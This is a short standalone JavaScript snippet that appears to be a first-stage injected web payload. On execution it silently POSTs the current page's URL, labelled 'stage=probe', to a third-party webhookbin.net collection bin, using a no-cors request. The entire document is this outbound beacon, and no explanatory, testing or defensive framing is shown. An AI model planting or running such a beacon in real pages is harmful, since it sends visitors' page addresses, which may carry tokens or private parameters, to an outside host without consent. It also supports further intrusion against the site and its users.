fetch('https://webhookbin.net/v1/bin/0c5eaa51-6cc3-4eca-aa3e-3dc7c76362f0', {
  method: 'POST',
  mode: 'no-cors',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: 'stage=probe&u=' + encodeURIComponent(location.href)
});
